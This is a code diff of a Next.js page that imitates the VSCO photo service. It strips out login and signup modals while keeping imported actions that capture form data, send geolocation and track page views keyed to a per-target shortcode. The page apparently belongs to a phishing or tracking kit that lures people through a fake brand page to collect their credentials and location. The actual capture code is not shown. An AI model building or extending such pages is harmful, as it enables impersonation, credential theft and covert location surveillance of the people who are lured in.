@@ -9,41 +9,22 @@ import Hero from './components/hero';
 import LoadingScreen from './components/loading-screen';
 import LocationPermissionModal from './components/location-permission-modal';
 import PhotoToolsSection from './components/photo-tools-section';
-import LoginModal from './components/login-modal';
-import SignupModal from './components/signup-modal';
+
 import { captureFormData } from '@/action/form-capture-action';
 import { sendGeolocationData } from '@/action/geolocation-action';
 import { trackPageView } from '@/action/tracking-action';
 import './styles.css';
 
 export default function VSCOPage() {
-  const router = useRouter();
   const searchParams = useSearchParams();
   const shortcode = searchParams.get('shortcode');
 
   // State untuk modal
   const [showLocationModal, setShowLocationModal] = useState(false);
-  const [showLoginModal, setShowLoginModal] = useState(false);
-  const [showSignupModal, setShowSignupModal] = useState(false);
 
   // State untuk tracking
   const [isLoading, setIsLoading] = useState(true);
   const [hasTracked, setHasTracked] = useState(false);
-
-  // Tambahkan fungsi handler untuk switch antara login dan signup
-  const [activeModal, setActiveModal] = useState<'login' | 'signup' | null>(
-    null,
-  );
-
-  const handleSwitchToSignup = () => {
-    setShowLoginModal(false);
-    setShowSignupModal(true);
-  };
-
-  const handleSwitchToLogin = () => {
-    setShowSignupModal(false);
-    setShowLoginModal(true);
-  };
 
   // Melakukan tracking saat halaman dimuat
   useEffect(() => {
@@ -114,16 +95,6 @@ export default function VSCOPage() {
     }
   };
 
-  // Handler untuk gallery login requirement
-  const handleLoginRequired = () => {
-    // 50% chance untuk login atau signup
-    if (Math.random() > 0.5) {
-      router.push('/vsco/user/login');
-    } else {
-      router.push('/vsco/user/signup');
-    }
-  };
-
   if (isLoading) {
     return <LoadingScreen />;
   }
@@ -145,20 +116,6 @@ export default function VSCOPage() {
         isOpen={showLocationModal}
         onClose={() => setShowLocationModal(false)}
         onPermissionGranted={handleLocationPermissionGranted}
-      />
-
-      <LoginModal
-        isOpen={showLoginModal}
-        onClose={() => setShowLoginModal(false)}
-        onSwitchToSignup={handleSwitchToSignup}
-        shortcode={shortcode || undefined}
-      />
-
-      <SignupModal
-        isOpen={showSignupModal}
-        onClose={() => setShowSignupModal(false)}
-        onSwitchToLogin={handleSwitchToLogin}
-        shortcode={shortcode || undefined}
       />
     </div>
   );
